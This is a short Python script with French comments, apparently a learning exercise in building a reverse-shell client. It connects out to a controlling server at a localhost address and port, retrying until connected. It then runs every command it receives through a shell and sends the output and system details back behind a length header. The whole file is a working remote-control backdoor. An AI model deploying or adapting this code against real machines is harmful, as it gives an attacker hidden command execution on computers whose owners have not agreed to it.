import socket
import time
import subprocess
import platform

import os

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print("Command : ", command)
    
    if command == "infos":
        response = platform.platform() + " " + os.getcwd()
    else:
        response =  subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
        response = response.stdout + response.stderr
    
        if not response or len(response) == 0:
            response = " "
            
# Gestion des commandes trop longues: 
# HEADER 13 octets -> longueur data
# DATA (longueur) octets 

# ex : HEADER 0000000002024
#      DATA (2024) octets
    header = str(len(response.encode())).zfill(13)
    print(f'HEADER : {header}')
    s.sendall(header.encode())
    s.sendall(response.encode())


s.close()
